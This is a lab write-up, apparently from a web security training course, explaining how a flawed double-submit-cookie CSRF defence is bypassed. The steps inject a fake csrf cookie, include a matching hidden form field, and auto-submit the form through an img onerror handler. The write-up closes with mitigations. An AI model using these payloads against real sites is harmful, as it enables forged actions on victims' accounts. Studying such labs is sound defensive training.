# Lab06 - CSRF Token Duplicated In Cookie

## Objective

Exploit a CSRF vulnerability caused by insecure "Double Submit Cookie" implementation.

---

# Lab Difficulty

```text
Practitioner
```

---

# Vulnerability Overview

The application uses:

```text
Double Submit Cookie
```

defense.

The token is stored:

- inside a cookie
- inside a request parameter

and validation simply checks:

```text
Cookie Value == Parameter Value
```

---

# Root Cause

The application stores no server-side token state.

Validation logic:

```text
Cookie == Parameter
        ↓
Accept Request
```

---

# Analysis

Request:

```http
Cookie:
csrf=ABC123

Body:
csrf=ABC123
```

---

Server validation:

```text
ABC123 == ABC123
```

Accepted.

---

# Problem

The attacker can control BOTH values.

---

# Attack Methodology

```text
Inject Fake Cookie
        ↓
Submit Matching Parameter
        ↓
Validation Passes
```

---

# Exploitation Steps

### Step 1

Capture email update request.

---

### Step 2

Observe:

```text
csrf Cookie
=
csrf Parameter
```

comparison.

---

### Step 3

Find search functionality vulnerable to cookie injection.

---

### Step 4

Inject:

```http
Set-Cookie:
csrf=fake
```

---

### Step 5

Create CSRF payload.

---

### Step 6

Set:

```html
<input type="hidden"
name="csrf"
value="fake">
```

---

### Step 7

Replace auto-submit script:

```html
<img src="COOKIE_INJECTION_URL"
onerror="document.forms[0].submit()">
```

---

### Step 8

Host exploit.

---

### Step 9

Deliver to victim.

---

# Why The Attack Works

The server validates only:

```text
Cookie == Parameter
```

instead of:

```text
Token Generated By Server
```

---

# Double Submit Cookie Weakness

```text
Attacker Controls Cookie
        ↓
Attacker Controls Parameter
        ↓
Validation Meaningless
```

---

# Mitigation

Applications should:

- Store token server-side
- Bind token to session
- Prevent cookie injection
- Implement SameSite protections

# Key Learnings

- Double Submit Cookie is often implemented incorrectly.
- Token equality alone is not sufficient protection.
- Server-side validation is critical.

> [!WARNING]
> If attackers can control both the cookie and parameter values, CSRF protection becomes ineffective.
